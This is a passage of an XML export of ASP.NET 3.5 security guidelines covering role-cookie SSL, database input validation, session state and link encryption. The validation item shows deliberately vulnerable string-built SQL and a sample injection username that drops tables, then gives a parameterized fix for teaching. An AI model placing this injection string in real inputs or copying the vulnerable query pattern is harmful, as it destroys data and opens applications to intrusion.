    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Restrict All Role Caching Cookies to HTTPS Connections</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authorization</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Use the &lt;strong&gt;cookieRequireSSL&lt;/strong&gt; attribute to restrict role caching cookies to HTTPS connections if role caching is being used.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Sending cookies out exclusively over SSL makes it much harder for an attacker to sniff the cookie values off the wire.&amp;nbsp; If an attacker can get a copy of an authorization cookie, they can potentially emulate that role, allowing them to elevate their privilege
 in the system. &lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;All systems which use authorization cookies should use SSL for those cookies if at all possible.&amp;nbsp; Systems which deal with any personally identifiable information or monetary transaction should use SSL in all circumstances without exception.
&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Set the &lt;strong&gt;cookieRequireSSL&lt;/strong&gt; attribute to true to specify that the authorization cookie with the role information should only be returned to the server over HTTPS connections.&amp;nbsp; The following example shows a
&lt;strong&gt;&amp;lt;roleManager&amp;gt;&lt;/strong&gt; element configured to protect the authorization cookie.
&lt;/p&gt;
&lt;pre&gt;&amp;lt;roleManager enabled=&amp;quot;true&amp;quot;             &lt;br&gt;  cacheRolesInCookie=&amp;quot;true&amp;quot;             &lt;br&gt;  cookieName=&amp;quot;.ASPROLES&amp;quot;             &lt;br&gt;  cookieTimeout=&amp;quot;30&amp;quot;             &lt;br&gt;  cookiePath=&amp;quot;/&amp;quot;             &lt;br&gt;  cookieRequireSSL=&amp;quot;true&amp;quot;             &lt;br&gt;  cookieSlidingExpiration=&amp;quot;true&amp;quot;             &lt;br&gt;  cookieProtection=&amp;quot;All&amp;quot;              &lt;br&gt;  createPersistentCookie=&amp;quot;false&amp;quot;&amp;gt;&lt;br&gt;&amp;lt;/roleManager&amp;gt;&lt;/pre&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:24e081c4-0c62-4c93-a91a-42a96892d74d"&gt;Use Role Caching if Role Store Lookups are too Costly&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>616fda5d-4e96-4bc0-8675-954794f52557</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Validate All Input Passed to Database</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Validate all input before it is passed to the database.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Unvalidated input can lead to persistent cross-site scripting, SQL injection, and other vulnerabilities which would allow an attacker to gain unauthorized access to sensitive data.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If your application uses a backend database server.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;To properly validate input passed to database:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify application inputs. &lt;/strong&gt;Potential sources of input include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URL based parameters &lt;/li&gt;&lt;li&gt;Form based parameters &lt;/li&gt;&lt;li&gt;Hidden fields &lt;/li&gt;&lt;li&gt;Cookies &lt;/li&gt;&lt;li&gt;Local filesystem &lt;/li&gt;&lt;li&gt;Javascript variables&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify database entry points.&lt;/strong&gt; Find all the locations in the system where data is pushed into the database, either directly via queries, or indirectly (via log entries, etc). Trace all database entry points to find all the paths which can
 contain external input.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Create a set of validators:&lt;/strong&gt; Build a set of validators that work with the data in question and fit into the system architecture, including your general validation scheme for other data and the way the system interacts with the database. Using
 the &lt;a href="?#ruledisplay:D06E3B85-CCD8-41EC-8861-36D30BBAE909"&gt;Validate Input for Length, Range, Format, and Type&lt;/a&gt; guideline, determine the appropriate validation at each validator. Centralize the validators as it helps strengthen your code by limiting
 the amount of scattered validation code throughout the system, and allows for easy auditing. Place the validators along the database input paths, ideally as close to the initial data input as possible. All data should pass through the validators before breing
 transmitted to the database servers.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Use Type-Safe parameters in SQL statements:&lt;/strong&gt; Stored procedures and Parameterized queries improve your application's robustness against SQL injection based attacks. Consult the guideline
&lt;a href="?#ruledisplay:3437DF81-6B8C-4A14-BB6E-34F6EE21C45F"&gt;Use Type Safe SQL Parameters When Constructing SQL Queries&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Audit your entry paths.&lt;/strong&gt; Before going into production, have a reviewer who was not responsible for the development of the code in question check all the input paths to ensure that the validators are correctly implemented, that they are correctly
 applied, and that all input paths are checked.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code validates the user based on a given username and password. It hashes the password with a random salt. Then it compares the username and the produced hash against the data stored in the backend database. Unfortunately, the SQL query is
 dynamically crafted by using the user's input. If there is no proper input validation, an attacker can access the application's database server through the use of SQL injection.&lt;/p&gt;
&lt;pre&gt;public boolean validateUser(String user, char[] pass)&lt;br&gt;{&lt;br&gt;      byte[] salt = MyApp.generateSalt();&lt;br&gt;      String passHash;&lt;br&gt;      SqlConnection cn;&lt;br&gt;      SqlCommand sqlCommand;&lt;br&gt;      String query;&lt;br&gt;      passHash = hashCredentials(pass, salt);&lt;br&gt;      // The application crafts the SQL query based on user's input&lt;br&gt;      cn = MyApp.getDBConnection();&lt;br&gt;      sqlCommand = new SqlCommand(&amp;quot;select user from myappUsers where user = \&amp;quot;&amp;quot;&lt;br&gt;&lt;br&gt;      &amp;#43; user &amp;#43; &amp;quot;\&amp;quot; and pass = \&amp;quot;&amp;quot; &amp;#43; passHash &amp;#43; &amp;quot;\&amp;quot; and login_attempts &amp;lt; 3;&amp;quot;, cn);&lt;br&gt;      SqlDataReader reader = sqlCommand.ExecuteReader();&lt;br&gt;      updateLastLoginAttempt(user);&lt;br&gt;      ...&lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;If a user submits a login request with a username of 'foo\&amp;quot; or 1 = 1; drop table *; --', the system will happily first authenticate the user and then drop all the tables in the database.&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following code validates the user based on a given username and password. It hashes the password with a random salt. Then it compares the username and the produced hash against the data stored in the backend database. Because the application uses the
 Parameters property, it is much more difficult for an attacker to gain access to the application's database server through the use of SQL injection.
&lt;/p&gt;
&lt;pre&gt;public boolean validateUser(String user, char[] pass)&lt;br&gt;{&lt;br&gt;   byte[] salt = MyApp.generateSalt();&lt;br&gt;   String passHash; &lt;br&gt;   SqlConnection cn;&lt;br&gt;   SqlCommand sqlCommand;&lt;br&gt;   String query;     &lt;br&gt;   passHash = hashCredentials(pass, salt);&lt;br&gt;   // The application crafts the SQL query based on user's input&lt;br&gt;   cn = MyApp.getDBConnection();&lt;br&gt;   sqlCommand = new SqlCommand(&amp;quot;select user from myappUsers where user = @user and &lt;br&gt;                    &amp;#43; pass = @passHash and login_attempts &amp;lt; 3;&amp;quot;, cn);&lt;br&gt;   sqlCommand.Parameters.Add(&amp;quot;@user&amp;quot;, SqlDbType.VarChar, user.Length).Value = user;&lt;br&gt;   sqlCommand.Parameters.Add(&amp;quot;@passHash &amp;quot;, SqlDbType.VarChar, passHash.Length).Value = passHash;&lt;br&gt;   SqlDataReader reader = sqlCommand.ExecuteReader(); &lt;br&gt;   updateLastLoginAttempt(user);  &lt;br&gt;   ...&lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;Even if the user passes in an arbitrary string for a username or a password, they will not be able to alter the query or otherwise effect the database. An even better solution would involve using a stored procedure instead of a parameterized command, because
 that would permit the database to be locked down further.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To learn more about using regular expression for input validation, visit: &lt;a href="http://msdn2.microsoft.com/en-us/library/ms998267.aspx"&gt;
How To: Use Regular Expressions to Constrain Input in ASP.NET&lt;/a&gt;. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:3437DF81-6B8C-4A14-BB6E-34F6EE21C45F"&gt;Guideline: Use Type Safe SQL Parameters When Constructing SQL Queries
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:D06E3B85-CCD8-41EC-8861-36D30BBAE909"&gt;Guideline: Validate Input for Length, Range, Format, and Type&amp;nbsp;&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:0FFC3880-7F2B-47A5-BC54-F9BD39117BDD"&gt;Guideline: Validate Input from All Sources
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:8F360E73-D932-4512-84B4-2D7A6632DA7F"&gt;Guideline: Use Stored Procedures
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764"&gt;Attack: SQL Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:8515588C-661A-4962-853F-6CD6ABCD8CF6"&gt;Attack: Server-Side Code Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:A61D6E7C-677C-463D-BB5D-7F36CAD4FF32"&gt;Checklist Item: All Database Input is Validated&lt;/a&gt;
&lt;hr&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>63bed887-fe89-4c08-a1ad-5bfa70ad52c4</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Disable the Session State Service if Unused</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Session Management</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;If the session state service is not used by your application, it should be disabled.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;By turning them off, you eliminate the redundant session processing performed by ASP.NET.&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;The session state can be&amp;nbsp;turned off&amp;nbsp;for an individual application by setting the
&lt;strong&gt;mode&lt;/strong&gt; attribute to &amp;quot;off&amp;quot; on the &lt;strong&gt;&amp;lt;sessionState&amp;gt;&lt;/strong&gt; element in Web.config as follows.&lt;/p&gt;
&lt;pre&gt;&amp;lt;sessionstate mode=&amp;quot;off&amp;quot; /&amp;gt;&lt;br&gt;&lt;/pre&gt;
&lt;h1&gt;See Also&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&amp;quot;Disable ASP Session State in ASP.NET&amp;quot; at &lt;a href="http://support.microsoft.com/default.aspx?scid=kb;en-us;306996"&gt;
http://support.microsoft.com/default.aspx?scid=kb;en-us;306996&lt;/a&gt; &lt;/li&gt;&lt;li&gt;&amp;quot;Configure SQL Server to Store ASP.NET Session State&amp;quot; at &lt;a href="http://support.microsoft.com/default.aspx?scid=kb;en-us;317604"&gt;
http://support.microsoft.com/default.aspx?scid=kb;en-us;317604&lt;/a&gt; &lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>65a24726-461b-452d-ac91-cfbfad841419</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Encrypt Communication Links</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Communication Security</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Encrypt the communication channels when interacting with other software across the network.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Encrypting the communication links allows the application to preserve confidentiality and integrity of the transmitted data.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If sensitive data must be transmitted between two hosts. The transmission could be between servers or between a client and a server.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;To encrypt the communication links:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify the connections used for transmitting sensitive data.&lt;/strong&gt; Enumerate all connections between the different entities. Identify the sensitive data that is sent over the network and the respective connections that are used for such communication.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Choose the appropriate encryption mechanism.&lt;/strong&gt; Depending on the infrastructure, you may consider using IPSec or TLS/SSL.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;IPSec.&lt;/strong&gt; IPSec is used when the encryption needs to be applied across all involved parties. Because IPSec is designed to secure connections between static hosts that are &amp;quot;always on&amp;quot;, use IPSec to secure the network connections between your
 application's servers. Use the following steps to utilize IPSec:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Create an IP Filter.&lt;/strong&gt; This restricts what computers can communicate with each other, and require that specific communication protocols are used. A filter consists of:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A source IP address or range of addresses. &lt;/li&gt;&lt;li&gt;A destination IP address or range of addresses. &lt;/li&gt;&lt;li&gt;An IP protocol, such as TCP, UDP, or &amp;quot;any.&amp;quot; &lt;/li&gt;&lt;li&gt;Source and destination ports (for TCP or UDP only).&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Create Filter Actions.&lt;/strong&gt; This procedure creates two filter actions. The first will be used to block all communications from specified computers and the second will be used to enforce the use of encryption between application server and database
 server computers.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Create Rules.&lt;/strong&gt; This procedure creates two new rules that will be used to associate the filter that you created in Procedure 1, with the two filter actions you created in Procedure 2.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Export the IPSec Policy to the Remote Computer.&lt;/strong&gt; The IPSec policy that you have created on the database server must now be exported and copied to the application server computer.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Assign Policies.&lt;/strong&gt; An IPSec policy must be assigned before it becomes active. Note that only one policy may be active at any one time on a particular computer.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that it Works.&lt;/strong&gt; Use Network Monitor (netmon.exe) to verify that data sent between the two servers is encrypted.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;TLS/SSL.&lt;/strong&gt; TLS/SSL provides granular protection. This allows the traffic containing sensitive data only to be encrypted. Because TLS/SSL has a certificate based design, it allows the protection of data between mobile hosts. Use TLS/SSL to
 secure the communication channel between your application and its users. While .NET provides APIs for handling SSL encrypted traffic, it is recommended to follow the manuals associated with any third party software that is being used. If your application uses
 SSL, ensure that you use SSL 3.0 and disable the cryptographically weak SSL 2.0 protocols.&lt;/p&gt;
&lt;p&gt;Use the following steps to configure IIS for using SSL:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Create a certificate request. &lt;/strong&gt;Using the IIS management console, generate an SSL certificate request. This request is then sent to a Certification Authority to be signed. Follow these steps to generate the certificate request.
&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Start the &lt;strong&gt;IIS management console&lt;/strong&gt;. To do this, click on &lt;strong&gt;
Control Panel&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Administrative Tools&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Internet Information Services&lt;/strong&gt;.
&lt;/li&gt;&lt;li&gt;Right click on your application's virtual host and select &lt;strong&gt;Properties&lt;/strong&gt;.
&lt;/li&gt;&lt;li&gt;Click on &lt;strong&gt;Server Certificate&lt;/strong&gt; under the &lt;strong&gt;Directory Security&lt;/strong&gt; tab.
&lt;/li&gt;&lt;li&gt;Select &lt;strong&gt;Create a new certificate&lt;/strong&gt; and click &lt;strong&gt;Next&lt;/strong&gt;.
&lt;/li&gt;&lt;li&gt;Select &lt;strong&gt;Prepare the request now, but send it later&lt;/strong&gt; and click &lt;strong&gt;
Next&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Provide &lt;strong&gt;your application's FQDN&lt;/strong&gt; and the desired bit length for your SSL certificate's encryption key, and then click
&lt;strong&gt;Next&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Provide &lt;strong&gt;your organization's details&lt;/strong&gt; and click &lt;strong&gt;Next&lt;/strong&gt;.
&lt;/li&gt;&lt;li&gt;Provide &lt;strong&gt;your application's FQDN&lt;/strong&gt; and click &lt;strong&gt;Next&lt;/strong&gt;.
&lt;/li&gt;&lt;li&gt;Provide &lt;strong&gt;your organization's location details&lt;/strong&gt; and click &lt;strong&gt;
Next&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Specify the location where you would like the IIS management console to store your application's certificate request.
&lt;/li&gt;&lt;li&gt;Click &lt;strong&gt;Finish&lt;/strong&gt; to complete the process.&lt;/li&gt;&lt;/ol&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Present the request to a Certification Authority (CA).&lt;/strong&gt; If all conditions for obtaining an SSL certificate are met, the CA will produce a new SSL certificate based on the certificate request. Because the requirements for obtaining an SSL
 certificate depend on the Certification Authority, consult with the Certification Authority in regards to the administrative steps necessary for obtaining such certificate.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Install the certificate.&lt;/strong&gt; Follow these steps to properly install your application's SSL certificate.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Start the &lt;strong&gt;IIS management console&lt;/strong&gt;. To do this, click on &lt;strong&gt;
Control Panel&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Administrative Tools&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Internet Information Services&lt;/strong&gt;.
&lt;/li&gt;&lt;li&gt;Right click on your application's virtual host and select &lt;strong&gt;Properties&lt;/strong&gt;.
&lt;/li&gt;&lt;li&gt;Click on &lt;strong&gt;Server Certificate&lt;/strong&gt; under the &lt;strong&gt;Directory Security&lt;/strong&gt; tab.
&lt;/li&gt;&lt;li&gt;Select &lt;strong&gt;Process the pending request and install the certificate&lt;/strong&gt; and click
&lt;strong&gt;Next&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Specify the location of your application's SSL certificate and click &lt;strong&gt;
Next&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Click &lt;strong&gt;Finish&lt;/strong&gt; to complete the process. &lt;/li&gt;&lt;/ol&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Apply the appropriate encryption mechanism. &lt;/strong&gt;Apply the encryption mechanism of choice at the appropriate locations in the code. Such locations include all functionality that establishes a connection between your application and another entity.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code establishes a connection between two servers. Unfortunately, the communication is not encrypted and it is possible for an attacker to eavesdrop on the connection.&lt;/p&gt;
&lt;pre&gt;public Stream Connect(string remoteHost, int remotePort)&lt;br&gt;{&lt;br&gt;    TcpClient client = new TcpClient(remoteHost, remotePort);&lt;br&gt;    NetworkStream netStream = client.GetStream();&lt;br&gt;    return netStream;&lt;br&gt;}&lt;/pre&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following code establishes a connection between two servers. Because the communication is encrypted the confidentiality of the data in transit is preserved and it is impossible for an attacker to eavesdrop on the connection.&lt;/p&gt;
&lt;pre&gt;public Stream Connect(string remoteHost, int remotePort)&lt;br&gt;{&lt;br&gt;    TcpClient client = new TcpClient(remoteHost, remotePort);&lt;br&gt;    SslStream netStream = new SslStream(client.GetStream(), false,&lt;br&gt;               new RemoteCertificateValidationCallback(this.ValidateSSLCertificate));&lt;br&gt;    try&lt;br&gt;    {&lt;br&gt;        netStream.AuthenticateAsClient(remoteHost);&lt;br&gt;    }&lt;br&gt;    catch (AuthenticationException ae)&lt;br&gt;    {&lt;br&gt;        client.Close();&lt;br&gt;        throw ae;&lt;br&gt;    }&lt;br&gt;    return netStream;&lt;br&gt;}&lt;/pre&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information about TLS, see: RFC for &lt;a href="http://www.faqs.org/rfcs/rfc2246.html"&gt;
Transport Layer Security&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;For a quick overview on IPSec, see: A publication on &lt;a href="http://www.digisafe.com/products/pdf/IPSec_Primer.pdf"&gt;
IPSec Primer&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;To learn more about using IPSec in a server farm, see: &lt;a href="http://msdn2.microsoft.com/en-us/library/aa302413.aspx"&gt;
How To: Use IPSec to Provide Secure Communication Between Two Servers&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;For more information about uses of IPSec, see: &lt;a href="http://msdn2.microsoft.com/en-us/library/aa302366.aspx"&gt;
How To: Use IPSec for Filtering Ports and Authentication&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;For more information about using IPSec for managing your server farm, see: &lt;a href="http://support.microsoft.com/kb/816521"&gt;
How To: Use IPSec Policy to Secure Terminal Services Communications in Windows Server 2003&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:FCB0A4AC-A559-430D-9145-08340EC73FED"&gt;Guideline: Protect Sensitive Data Over the Network
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:B9E7568A-907C-43C9-9CED-F0CCA09F76CB"&gt;Guideline: Use SSL When Transmitting Credentials
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:48BB4D3A-9295-4263-B3E7-090E483DEC5D"&gt;Attack: Man in the Middle Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9"&gt;Attack: Information Disclosure Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:CBB29250-7ED3-4FDD-9B28-E3EE07EAF911"&gt;Attack: HTTP Replay Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:DEBB5734-39D0-4922-BDEE-1E0547E22DAD"&gt;Attack: Chosen Plaintext Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:3B657A67-F660-4DB5-9267-6E0FE2DAA1EB"&gt;Attack: Chosen Ciphertext Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:13EE90D9-B0F6-45D6-913A-BA8527525A04"&gt;Attack: Traffic Analysis Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:24D078E3-A02F-4EDF-A6EA-DA0E3E5FFE5E"&gt;Attack: Key Bruteforce Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:B446B34C-8DEC-4F74-A392-C30D1719D90D"&gt;Attack: Trust Relationship Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:9E3FC30A-B55C-4AF6-8B77-A534C6F87197"&gt;Attack: Phishing Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:F4F69A8F-F164-4821-89D3-B49571922848"&gt;Checklist Item: Communication Links are Encrypted&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>69cae495-2512-4216-b5d5-4e701ad6b65f</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Use ASP.NET Role Manager for Roles Authorization</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authorization</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Use the ASP.NET role manager for role-based authorization instead of writing custom code.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;ASP.NET provides a role manager feature that automatically allows you to create, manage, and look up roles for the currently authenticated user.&amp;nbsp; Role managers reduce possibilities for serious security issues from programmer errors and reduce the amount
 of custom code needed for an application. &lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If your application uses windows authentication&amp;nbsp;or stores roles in SQL server you&amp;nbsp;should use ASP.NET role managers.&amp;nbsp; If you need an authorization scheme or a feature not present in the provided role managers, write a custom role manager instead of an entirely
 custom authorization scheme so you can leverage the existing interfaces. &lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Roles are accessed from the configured role store by the &lt;strong&gt;RoleManager&lt;/strong&gt; HTTP module by using the configured role provider.&amp;nbsp; This occurs after the user is authenticated but before URL authorization and file authorization access checks occur
 and before programmatic role checks can occur. &lt;/p&gt;
&lt;p&gt;To use the role manager feature in an ASP.NET application, you need to do the following:
&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Add a &amp;lt;&lt;strong&gt;roleManager&lt;/strong&gt;&amp;gt; element beneath the &amp;lt;&lt;strong&gt;system.web&lt;/strong&gt;&amp;gt; section of your application's Web.config file and enable role manager by setting its
&lt;strong&gt;enabled&lt;/strong&gt; attribute to &lt;strong&gt;true&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Add a connection string to the &amp;lt;&lt;strong&gt;connectionStrings&lt;/strong&gt;&amp;gt; section to point to your roles store. If you are using the
&lt;strong&gt;AuthorizationStoreRoleProvider&lt;/strong&gt;, this is an LDAP query string pointing to your Authorization Manager Policy store in Active Directory or ADAM. If you are using the
&lt;strong&gt;SqlRoleProvider&lt;/strong&gt;, this is a database connection string that points to your role store database.
&lt;/li&gt;&lt;li&gt;Configure the specific provider in the &amp;lt;&lt;strong&gt;roleManager&lt;/strong&gt;&amp;gt;&lt;strong&gt;
&lt;/strong&gt;element in your application's Web.config file. The role manager system supports the following providers:
&lt;/li&gt;&lt;li&gt;If your application roles are in an Authorization Manager Policy store in Active Directory or ADAM, use the
